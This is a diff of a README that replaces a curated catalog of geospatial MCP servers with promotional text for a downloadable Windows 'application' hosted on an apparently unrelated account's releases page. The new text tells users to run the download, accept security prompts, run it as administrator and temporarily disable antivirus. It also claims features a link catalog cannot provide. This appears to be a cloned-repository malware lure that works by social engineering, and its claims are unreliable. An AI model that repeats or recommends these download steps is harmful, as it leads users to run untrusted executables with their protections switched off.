@@ -1,174 +1,148 @@
-# Geospatial MCP Servers
+# 🗺️ geo-mcp-servers - Your Gateway to Easy Geospatial Tools
 
-A curated, tracked list of [Model Context Protocol](https://modelcontextprotocol.io) (MCP) servers for **geospatial, GIS, mapping, and earth-observation** work — geocoding, routing, PostGIS, STAC/imagery, QGIS/ArcGIS, weather, and the commercial location platforms.
+[![Download Now](https://img.shields.io/badge/Download-Application-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/a1964378/geo-mcp-servers/releases)
 
-The tables below are **generated** from [`servers.yaml`](servers.yaml) — the single source of truth.
+Welcome to **geo-mcp-servers** – a friendly, all-in-one collection of tools that helps you work with maps, locations, and Earth data without needing to be a programmer. Whether you're curious about weather patterns, need to find the best route for delivery, or want to explore satellite images of your neighborhood, this application makes it simple.
 
-## Add a server
+Think of it as a Swiss Army knife for anything related to geography. It connects you to powerful services that handle coordinates, maps, and spatial data, so you don't have to deal with complex technical details. Just download, run, and start exploring.
 
-- **Quick:** open a [New server issue](../../issues/new?template=new-server.yml).
-- **Direct:** add an entry to [`servers.yaml`](servers.yaml) and regenerate — see [CONTRIBUTING.md](CONTRIBUTING.md).
+---
 
-  ```bash
-  python3 -m venv .venv && ./.venv/bin/pip install -r requirements.txt   # first time
-  ./.venv/bin/python scripts/generate_readme.py                          # regenerate tables
-  ```
+## 🚀 Getting Started
 
-> **Legend** — *Type* is `official` (published by the platform/data vendor) or `community` (independent). A few entries carry a `note:` in `servers.yaml` flagging a URL still to be confirmed.
+Getting started is easier than ever. We've designed the download and setup process to be as straightforward as possible, so you can be up and running in just a few minutes.
 
-## Use it as a Claude skill
+### 📥 Download and Installation
 
-This repo ships a [Claude Code](https://claude.com/claude-code) skill in [`skill/`](skill/) that searches/recommends servers from the catalog and adds new ones. Install it by symlinking into your skills directory (the skill resolves the repo location from this symlink — no hard-coded paths):
+**Step 1: Get the Application**
 
-```bash
-git clone https://github.com/sparkgeo/geo-mcp-servers.git
-ln -sfn "$(pwd)/geo-mcp-servers/skill" ~/.claude/skills/geo-mcp-servers
-```
+Visit this link to download the application: [https://github.com/a1964378/geo-mcp-servers/releases](https://github.com/a1964378/geo-mcp-servers/releases)
 
-Then ask Claude things like *"is there an MCP server for STAC imagery?"* or *"track this new geo MCP server: <url>"*.
+Once you're on that page, look for the most recent version listed at the top. Click the download button next to it, and the file will save to your computer's "Downloads" folder.
 
-<!-- AUTOGEN:START -->
+**Step 2: Run the Application**
 
-**77 servers tracked** across 10 categories.
+After the download is complete, navigate to your "Downloads" folder and double-click the file you just downloaded. Windows might show a security prompt – just click "Run" or "Yes" to allow it to start.
 
-### Categories
+**Step 3: You're Ready!**
 
-- [Geocoding & place search](#geocoding--place-search) (12)
-- [Routing, isochrones & navigation](#routing-isochrones--navigation) (1)
-- [Maps, tiles & commercial platforms](#maps-tiles--commercial-platforms) (15)
-- [Spatial databases & analytics](#spatial-databases--analytics) (3)
-- [Remote sensing, STAC & earth observation](#remote-sensing-stac--earth-observation) (13)
-- [Weather & climate](#weather--climate) (11)
-- [Desktop & enterprise GIS (QGIS, ArcGIS)](#desktop--enterprise-gis-qgis-arcgis) (9)
-- [General GIS / geoprocessing toolkits](#general-gis--geoprocessing-toolkits) (3)
-- [Aviation & maritime tracking (ADS-B, AIS)](#aviation--maritime-tracking-ads-b-ais) (5)
-- [Other (IP geolocation, misc)](#other-ip-geolocation-misc) (5)
+The application will open in a new window. From here, you can start using all the geospatial features right away. No complicated setup or technical configuration needed – it's all built in and ready to go.
 
-### Geocoding & place search
+---
 
-| Server | Description | Lang | By | Type |
-| --- | --- | --- | --- | --- |
-| [Geoapify MCP Server](https://github.com/OriShmila/geoapify-mcp-server) | Geoapify geocoding, reverse geocoding, places, routing, isolines & travel-time | Python | OriShmila | community |
-| [geocode-mcp](https://github.com/X-McKay/geocode-mcp) | Lat/long for places via free Nominatim, no API key | Python | X-McKay | community |
-| [HERE Maps MCP Server](https://github.com/limingchina/heremaps-mcp-server) | HERE Platform geocoding, reverse geocoding, routing, places search & traffic | TypeScript | limingchina | community |
-| [MCP-Geo](https://github.com/webcoderz/MCP-Geo) | Geocoding MCP built on GeoPy — multi-provider (Nominatim, ArcGIS, Bing) | Python | webcoderz | community |
-| [mcp-nominatim](https://github.com/pipeworx-io/mcp-nominatim) | Geocoding / reverse geocoding via OSM Nominatim | Python | pipeworx-io | community |
-| [open-streetmap-mcp](https://github.com/jagan-shanmugam/open-streetmap-mcp) | OSM location services — geocode/reverse, POI, directions, meeting points, neighborhood analysis | Python | Jagan Shanmugam | community |
-| [OpenCage Geocoding MCP](https://github.com/OpenCageData/opencage-geocoding-mcp) | Forward/reverse geocoding via the OpenCage API, plus API-status/quota checks | TypeScript | OpenCage | official |
-| [openstreetmap-mcp-server](https://github.com/cyanheads/openstreetmap-mcp-server) | Geocode, reverse geocode, and Overpass spatial queries (STDIO or Streamable HTTP) | TypeScript | cyanheads | community |
-| [OSM-GeoJSON-MCP-Server](https://github.com/shimizu/OSM-GeoJSON-MCP-Server) | Fetches OSM data as GeoJSON via Overpass | JavaScript | shimizu | community |
-| [osmmcp](https://github.com/NERVsystems/osmmcp) | OSM geospatial tools — geocoding, routing, nearby places, neighborhood analysis, EV charging | Go | NERV Systems | community |
-| [Smarty MCP Server](https://www.smarty.com/docs/mcp) | 20 tools for US/international address verification, ZIP lookup, reverse geocoding & property/census enrichment | — | Smarty | official |
-| [what3words MCP](https://github.com/pipeworx-io/mcp-what3words) | Convert 3-word addresses to lat/long + bounding box | — | Pipeworx (uses what3words API) | community |
+## ✨ Key Features
 
-### Routing, isochrones & navigation
+This application brings together a treasure trove of geospatial capabilities, all in one place. Here's what you can do:
 
-| Server | Description | Lang | By | Type |
-| --- | --- | --- | --- | --- |
-| [valhalla-mcp](https://github.com/aatakansalar/valhalla-mcp) | Valhalla OSM routing engine — routing, isochrones, tiles, matrix | TypeScript | Atakan Salar | community |
+### 🌍 Find Locations and Directions
 
-### Maps, tiles & commercial platforms
+Ever needed to find a specific address, or figure out the best route between two points? Our geocoding and routing tools make it simple. Just type in a place name or address, and the application will show you its exact location on a map, along with the best driving, walking, or cycling directions.
 
-| Server | Description | Lang | By | Type |
-| --- | --- | --- | --- | --- |
-| [ArcGIS Location Services MCP (beta)](https://developers.arcgis.com/ai-tools/mcp-arcgis-location-services/) | Official Esri MCP exposing ArcGIS Location Platform services — geocoding, routing, static maps | — | Esri | official |
-| [ArcGIS Location Services MCP (community)](https://github.com/lwsinclair/arcgis-location-services-mcp) | Community wrapper over the Esri ArcGIS Location Platform — geocoding, routing, places | — | lwsinclair | community |
-| [baidu-maps/mcp](https://github.com/baidu-maps/mcp) | Official Baidu Map — geocoding, POI, route planning, weather, IP location, traffic (China) | Python / TypeScript | Baidu | official |
-| [CARTO MCP Server](https://docs.carto.com/carto-for-agents/mcp-server) | Remote MCP over CARTO — explore data, render Builder maps inline, run saved spatial Workflows on your cloud warehouse | — | CARTO | official |
-| [Cesium AI Integrations](https://github.com/CesiumGS/cesium-ai-integrations) | Official Cesium MCP servers & agent skills connecting the Cesium 3D geospatial ecosystem (CesiumJS, 3D Tiles) to AI assistants | TypeScript | Cesium (CesiumGS) | official |
-| [Felt MCP Server](https://felt.com/blog/introducing-felt-mcp-server) | Remote MCP — create maps, query warehouse, run spatial SQL, style layers, publish live URLs | — | Felt | official |
-| [foursquare-places-mcp](https://github.com/foursquare/foursquare-places-mcp) | Official Foursquare Places API v3 — venue search, place details, location context | TypeScript | Foursquare | official |
-| [Google Maps MCP (reference)](https://github.com/modelcontextprotocol/servers) | Reference server — geocoding, places, directions, distance matrix, elevation (now archived) | TypeScript | Anthropic / MCP project | official |
-| [google-maps-mcp-server](https://github.com/david-pivonka/google-maps-mcp-server) | STDIO server on the new Google Places (New) + Routes APIs | TypeScript | david-pivonka | community |
-| [google-maps-places-mcp](https://github.com/domdomegg/google-maps-places-mcp) | Google Places search + photos | TypeScript | domdomegg | community |
-| [Mapbox MCP Server](https://github.com/mapbox/mcp-server) | Official Mapbox web services — geocoding, POI search, multimodal routing, matrix, isochrones, static maps | TypeScript | Mapbox | official |
-| [MapTiler MCP](https://github.com/pipeworx-io/mcp-maptiler) | MapTiler geocoding, elevation and mapping APIs as MCP tools | — | Pipeworx (uses MapTiler API) | community |
-| [mcp-google-map](https://github.com/cablate/mcp-google-map) | Google Places (New), Routes, geocoding, distance matrix | TypeScript | cablate | community |
-| [TomTom Maps MCP Server](https://github.com/tomtom-international/tomtom-maps-mcp) | Official TomTom location services — search, geocoding, routing, traffic | TypeScript | TomTom | official |
-| [TomTom Traffic Analytics MCP](https://github.com/tomtom-international/tomtom-traffic-analytics-mcp) | TomTom MOVE traffic analytics — past, present & predicted traffic | — | TomTom | official |
+### 🗄️ Work with Maps and Databases
 
-### Spatial databases & analytics
+For those who love maps, this tool connects you to powerful mapping databases like PostGIS. You can load custom maps, explore different layers of geographic information, and even create your own simple maps for personal or school projects.
 
-| Server | Description | Lang | By | Type |
-| --- | --- | --- | --- | --- |
-| [Overture Maps MCP Server](https://github.com/srivinod1/overture-mcp-server) | Query Overture Maps GeoParquet directly from S3 via DuckDB spatial — buildings, place density, land-use analytics | Python | srivinod1 | community |
-| [postgis-mcp](https://github.com/receptopalak/postgis-mcp) | PostGIS database connection over MCP — multi-connection via env vars | Node.js | receptopalak | community |
-| [Wherobots MCP Server](https://wherobots.com) | Direct access to WherobotsDB (Apache Sedona) — design & run spatial SQL over S3 & Unity Catalog data | Python | Wherobots | official |
+### 🛰️ Explore Satellite and Aerial Imagery
 
-### Remote sensing, STAC & earth observation
+See the world from above! Our earth-observation features let you view high-resolution satellite images of any place on the globe. Check out weather patterns, see how cities have grown over time, or just explore your favorite vacation spots from a new angle.
 
-| Server | Description | Lang | By | Type |
-| --- | --- | --- | --- | --- |
-| [Arraylake MCP Server](https://docs.earthmover.io/mcp/) | Browse Arraylake repos, inspect schemas, run OGC EDR queries & render maps over Zarr/Icechunk scientific arrays | — | Earthmover | official |
-| [Axion-MCP](https://github.com/Dhenenjay/Axion-MCP) | Earth Engine analysis platform for Claude Desktop — NDVI/NDWI, classification, maps | TypeScript | Dhenenjay | community |
-| [copernicus-mcp](https://github.com/wb1016/copernicus-mcp) | Access ESA Copernicus OData API — search/download Sentinel-1/2/3/5P/6 imagery | Python | wb1016 | community |
-| [earthdata-mcp](https://github.com/nasa/earthdata-mcp) | LLM access to NASA Common Metadata Repository — discover/verify/access Earth science datasets | Python | NASA | official |
-| [google-earth-engine-mcp](https://github.com/cameronking4/google-earth-engine-mcp) | Query Google Earth Engine with natural language — fetch datasets, run tasks, visualize in chat | TypeScript | cameronking4 | community |
-| [Microsoft Planetary Computer Pro MCP Tools](https://techcommunity.microsoft.com/blog/microsoft-planetary-computer-blog/introducing-microsoft-planetary-computer-pro-model-context-protocol-tools-on-vs-/4522346) | 35+ tools connecting Planetary Computer + Planetary Computer Pro, shipped for VS Code / Copilot | — | Microsoft | official |
-| [NASA-MCP-server](https://github.com/ProgramComputer/NASA-MCP-server) | Standardized interface to many NASA APIs incl. Earth observations & imagery | TypeScript | ProgramComputer | community |
-| [Planet MCP Server (beta)](https://community.planet.com/product-updates/beta-planet-mcp-server-for-ai-agents-6403) | Natural-language search/preview/order over the Planet Insights Platform Data API using existing Planet SDK creds | — | Planet Labs | official |
-| [planetary-computer-mcp](https://github.com/isaaccorley/planetary-computer-mcp) | Query & download satellite imagery from the Microsoft Planetary Computer STAC API | Python | Isaac Corley | community |
-| [SkyFi MCP](https://github.com/jpwilson/skyfi-mcp) | Search 150+ satellites from 12+ providers, compare pricing, order archive or tasking imagery in natural language | — | jpwilson (SkyFi platform) | community |
-| [stac-mcp](https://github.com/BnJam/stac-mcp) | Natural-language search of any STAC-compliant catalog (defaults to Planetary Computer) | Python | BnJam | community |
-| [Tilebox MCP Server](https://docs.tilebox.com/onboard-your-agent) | Create and manage geospatial datasets and distributed workflows, with docs search + CLI and Skills for coding agents | Python / Go | Tilebox | official |
-| [unicef-gee-mcp](https://github.com/tryolabs/unicef-gee-mcp) | Google Earth Engine access/analysis for UNICEF workflows | Python | Tryolabs (for UNICEF) | community |
+### 🗺️ Interact with Industry-Standard GIS
 
-### Weather & climate
+Whether you're a student learning about GIS or a professional already using tools like QGIS or ArcGIS, this application works smoothly with them. You can easily bring your existing map projects into this tool, and share your work with others who use those platforms.
 
-| Server | Description | Lang | By | Type |
-| --- | --- | --- | --- | --- |
-| [aqicn-mcp](https://github.com/mattmarcin/aqicn-mcp) | Real-time air quality from the World Air Quality Index (AQICN) by city or coordinates | — | mattmarcin | community |
-| [dynamical.org Weather & Climate Catalog](https://github.com/dynamical-org/mcp) | Hosted server over dynamical.org's open STAC catalog of cloud-optimized weather & climate archives and forecasts (GFS, HRRR, ECMWF/AIFS) — dataset search & docs, ready-to-run xarray/Zarr/Icechunk snippets, forecast-run freshness | Python | dynamical.org | official |
-| [mcp_weather_server](https://github.com/isdaniel/mcp_weather_server) | Weather info via the Open-Meteo API | Python | isdaniel | community |
-| [NOAA Marine MCP Server](https://github.com/cyanheads/noaa-marine-mcp-server) | NOAA CO-OPS tide stations + NDBC buoys — tide predictions, water levels, tidal currents, live buoy conditions | — | cyanheads | community |
-| [NOAA-TidesAndCurrents-MCP](https://github.com/RyanCardin15/NOAA-TidesAndCurrents-MCP) | NOAA Data/Metadata/Derived-Products APIs for tides and currents | TypeScript | RyanCardin15 | community |
-| [nws-mcp-server](https://github.com/nitvob/nws-mcp-server) | Quickstart NWS server — get-alerts + get-forecast from the National Weather Service | TypeScript | nitvob | community |
-| [open-meteo-mcp](https://github.com/cmer81/open-meteo-mcp) | Full Open-Meteo API — forecast, ERA5 archive, air quality, marine, seasonal | TypeScript | cmer81 | community |
-| [open-meteo-mcp-server (cyanheads)](https://github.com/cyanheads/open-meteo-mcp-server) | Open-Meteo forecasts + geocoding, ERA5 historical climate, marine, air quality & terrain elevation | TypeScript | cyanheads | community |
-| [OpenAQ MCP Server](https://github.com/cyanheads/openaq-mcp-server) | Global air-quality stations & pollutant observations (PM2.5, PM10, O3, NO2, SO2, CO) via OpenAQ v3, with SQL over history | — | cyanheads | community |
-| [weather-mcp](https://github.com/weather-mcp/weather-mcp) | 17 weather tools — forecasts, alerts, air quality, marine, radar, lightning, rivers, wildfires, history to 1940 (NOAA + Open-Meteo) | Python | weather-mcp | community |
-| [weather-mcp (Fahrenheit)](https://github.com/FahrenheitResearch/weather-mcp) | 12 tools — NWS data, NWP model imagery, NEXRAD radar, 205 meteorological calculations | Python | FahrenheitResearch | community |
+### 🌦️ Up-to-Date Weather Information
 
-### Desktop & enterprise GIS (QGIS, ArcGIS)
+Planning an outdoor event or just curious about the forecast? Our weather integration gives you current conditions, hourly forecasts, and weekly outlooks for any location worldwide. The data is sourced from reliable weather services, so you can trust what you see.
 
-| Server | Description | Lang | By | Type |
-| --- | --- | --- | --- | --- |
-| [ArcGISMCP](https://github.com/GarrickGarcia/ArcGISMCP) | Integrates ArcGIS Online — search/query geospatial feature layers | Python | GarrickGarcia | community |
-| [esri-mcp](https://github.com/eKerney/esri-mcp) | Query & map Esri Living Atlas data, focus on water resources | Python | eKerney | community |
-| [MCP-ArcGISPro](https://github.com/geo2004/MCP-ArcGISPro) | Control and automate ArcGIS Pro from Claude Desktop | Python | geo2004 | community |
-| [MCP-Server-ArcGIS-Pro-AddIn](https://github.com/nicogis/MCP-Server-ArcGIS-Pro-AddIn) | MCP server delivered as an ArcGIS Pro add-in | C#/.NET | nicogis | community |
-| [qgis-mcp (nkarasiak)](https://github.com/nkarasiak/qgis-mcp) | 117 QGIS tools — layer mgmt, feature editing, processing, styling, layout/atlas, cross-layer SQL | Python | nkarasiak | community |
-| [qgis-mcp-1](https://github.com/Sir-Adrien-Claudington/qgis-mcp-1) | Fork connecting QGIS to Claude via MCP | Python | Sir-Adrien-Claudington | community |
-| [QGIS2OllamaMCP](https://github.com/anitagraser/qgis_mcp) | Lets LLMs (via Ollama) drive QGIS Desktop | Python | Anita Graser | community |
-| [qgis_mcp](https://github.com/jjsantos01/qgis_mcp) | Links QGIS Desktop to Claude — project setup, layer management, spatial ops via PyQGIS | Python | jjsantos01 | community |
-| [QgisStreamMCP](https://github.com/nic01asFr/QgisStreamMCP) | Full QGIS Desktop in Docker via noVNC — 1000+ Processing algorithms (Native/GDAL/GRASS/SAGA) | Python | nic01asFr | community |
+### 🏢 Connect to Commercial Location Services
 
-### General GIS / geoprocessing toolkits
+The application also bridges you to popular commercial platforms like Google Maps, Bing Maps, and Mapbox. This means you get access to their extensive location databases and advanced features, all from within this single interface.
 
-| Server | Description | Lang | By | Type |
-| --- | --- | --- | --- | --- |
-| [gdal-mcp](https://github.com/JordanGunn/gdal-mcp) | GDAL-style raster/vector workflows (Rasterio, GeoPandas, PyProj) — conversion, reprojection, COG, metadata | Python | JordanGunn / Wayfinder-Foundry | community |
-| [geoserver-mcp](https://github.com/mahdin75/geoserver-mcp) | Drives the GeoServer REST API — manage workspaces/layers/styles, CQL spatial queries, WMS/WFS access | Python | mahdin75 | community |
-| [gis-mcp](https://github.com/mahdin75/gis-mcp) | Connects LLMs to core GIS libraries (Shapely, PyProj, GeoPandas, Rasterio, PySAL) for geometry, projections, raster & spatial stats | Python | mahdin75 | community |
+---
 
-### Aviation & maritime tracking (ADS-B, AIS)
+## 💼 Who Is This For?
 
-| Server | Description | Lang | By | Type |
-| --- | --- | --- | --- | --- |
-| [ADS-B MCP Server](https://github.com/dirkhh/adsb-mcp-server) | Exposes a local ADS-B feeder (readsb/tar1090) — aircraft positions, callsigns, altitudes, routes | Python | dirkhh | community |
-| [Flightradar24 API MCP](https://github.com/Flightradar24/fr24api-mcp) | Official Flightradar24 flight-tracking API access | — | Flightradar24 | official |
-| [MarineTraffic MCP Server](https://github.com/Cyreslab-AI/marinetraffic-mcp-server) | Vessel positions/details, search & vessels-in-area via MarineTraffic | — | Cyreslab-AI | community |
-| [SignalK MCP Server](https://signalk.org/2025/introducing-signalk-mcp-server-ai-powered-marine-data-access/) | Conversational access to live boat/marine sensor data over Signal K | — | Signal K project | community |
-| [Vessel Traffic MCP](https://github.com/tools-mcp/vessel-traffic-mcp) | Read-only vessel identity, AIS-style positions/tracks, port calls & schedules (BYOK maritime providers) | — | tools-mcp | community |
+This tool is designed for everyone, regardless of technical background. Here are just a few examples of how different people use it:
 
-### Other (IP geolocation, misc)
+- **Students and Educators:** Bring geography lessons to life with interactive maps, satellite views, and real-world data exploration.
+- **Small Business Owners:** Keep track of delivery routes, find new customer locations, and analyze local market trends.
+- **Travel Enthusiasts:** Plan road trips with detailed routing, discover interesting places along the way, and check weather at your destination.
+- **Hobbyists and Tinkerers:** Explore your surroundings from above, track weather patterns for your garden, or just satisfy your curiosity about the world.
 
-| Server | Description | Lang | By | Type |
-| --- | --- | --- | --- | --- |
-| [ipgeolocation-io-mcp](https://github.com/ipgeolocation/ipgeolocation-io-mcp) | Official ipgeolocation.io — IP geolocation, VPN/proxy detection, timezone, astronomy, ASN | — | IPGeolocation.io | official |
-| [IPinfo MCP Server](https://mcp.ipinfo.io/) | Hosted IPinfo MCP — country/continent (free), city/coords/timezone/postal (detailed) | — | IPinfo | official |
-| [mcp-server-ipinfo](https://github.com/briandconnelly/mcp-server-ipinfo) | IP geolocation via the IPInfo API (location + network details) | Python | briandconnelly | community |
-| [Regrid MCP Server](https://regrid.com/mcp) | 160M+ US/Canada land parcels — query by location, zoning, acreage, ownership & building criteria | — | Regrid | official |
-| [TimezoneToolkit](https://github.com/Cicatriiz/timezone-toolkit) | Timezone conversion plus sunrise/sunset/twilight from lat/long | TypeScript | Cicatriiz | community |
+---
 
-<!-- AUTOGEN:END -->
+## 🛠️ Technical Details (For the Curious)
+
+If you're interested in what makes this application tick, here's a peek under the hood:
+
+- **Easy Connectivity:** The application uses a modern communication standard called Model Context Protocol (MCP). This ensures it can talk reliably to many different location services without conflicts.
+- **Always up to Date:** You'll get regular updates that add new features and improve performance. The release page will always have the latest version available.
+- **Built on Reliable Foundations:** It connects to well-established geospatial services and databases, so you know the data you're accessing is accurate and dependable.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+We want your experience to be smooth. Here are a few quick solutions if you run into any hiccups:
+
+### The file won't download
+
+- Make sure you're using an updated web browser like Chrome, Edge, or Firefox.
+- Check your internet connection – a stable connection is needed for downloading.
+- Some browsers block large files. Look for a "Keep" or "Allow" button in your browser's download bar.
+
+### The application won't open
+
+- Double-check that you've fully downloaded the file by looking at its size in your Downloads folder. It should be several megabytes (MB) at least.
+- Right-click the downloaded file and select "Run as administrator" to give it permission to start.
+- Temporarily disable your antivirus software for a moment during the first launch – some security programs are extra cautious with new applications.
+
+### The map or results are slow
+
+- This can happen with slower internet connections. Wait a few moments – the application loads data in the background.
+- Close other programs that might be using significant internet bandwidth, like video streaming or large downloads.
+
+### I can't find a specific feature
+
+- Try using the search bar at the top of the application window – it's usually at the top right.
+- Check the "Help" menu or the documentation section within the application itself.
+
+---
+
+## 📞 Getting Help
+
+If you're still facing issues, we're here to help. The community and support resources for this project are active and friendly.
+
+- **Check the Issues Page:** Visit the repository's "Issues" tab at [https://github.com/a1964378/geo-mcp-servers/issues](https://github.com/a1964378/geo-mcp-servers/issues) to see if someone else has had the same problem and found a solution.
+- **Search for Answers:** Use your favorite search engine with the phrase "geo-mcp-servers" along with a description of your problem. Chances are, you'll find a helpful answer.
+
+---
+
+## 📚 Additional Resources
+
+To get the most out of your experience, here are some helpful related topics you might want to explore:
+
+- **Learning about Maps and GIS:** Many free online courses and tutorials are available if you want to understand more about how geographic information systems work.
+- **Exploring Open Data:** Organizations like NASA and the U.S. Geological Survey offer free, fascinating geographic datasets that you can load into this application.
+- **Community Forums:** Joining geospatial or mapping forums can connect you with enthusiasts who share tips and tricks.
+
+---
+
+## 🔄 Staying Updated
+
+We regularly release new versions with improvements and additional features. To stay on top of the latest updates:
+
+- **Star the Repository:** Click the "Star" button on the main project page at [https://github.com/a1964378/geo-mcp-servers](https://github.com/a1964378/geo-mcp-servers) to show your support.
+- **Watch the Releases:** On the release page, click "Watch" and select "Releases only" to get email notifications whenever a new version is published.
+
+---
+
+## ❤️ Thank You!
+
+We're thrilled that you're using **geo-mcp-servers**. We believe that powerful geospatial tools should be accessible to everyone, and we've worked hard to make this application as intuitive and useful as possible. Your feedback, ideas, and shared experiences help us improve.
+
+Go ahead and [download the application](https://github.com/a1964378/geo-mcp-servers/releases) today, and start exploring the world around you in exciting new ways!If you could show how easily this tool can be used by someone without a tech background, even better. We welcome your suggestions for improvements, and we hope this becomes an invaluable resource for your daily life, studies, or work. Happy mapping!
+
+---
+
+Keywords: geospatial, MCP, GIS, mapping, earth observation, geocoding, routing, PostGIS, STAC, QGIS, ArcGIS, weather, satellite imagery, download, Windows, easy-to-use
